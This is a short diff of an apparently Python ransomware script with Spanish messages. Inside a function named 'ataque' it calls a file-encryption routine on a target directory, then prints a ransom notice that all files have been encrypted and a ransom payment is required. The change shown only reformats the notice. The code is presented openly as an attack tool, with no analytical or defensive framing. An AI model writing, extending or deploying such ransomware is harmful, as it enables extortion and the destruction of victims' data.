@@ -259,8 +259,7 @@ def ataque(directorio):
     cifrar_archivos(directorio, publica_local)
 
     print("\n" + "="*60)
-    print("  *** Como castigo por tus pecados digitales,")
-    print("      la undecima plaga ha caido sobre ti ***")
+    print("  *** Como castigo por tus pecados digitales, la undecima plaga ha caido sobre ti ***")
     print("="*60)
     print("  [!] TODOS TUS ARCHIVOS HAN SIDO CIFRADOS")
     print("  [!] Para recuperarlos debes realizar un pago por rescate.")
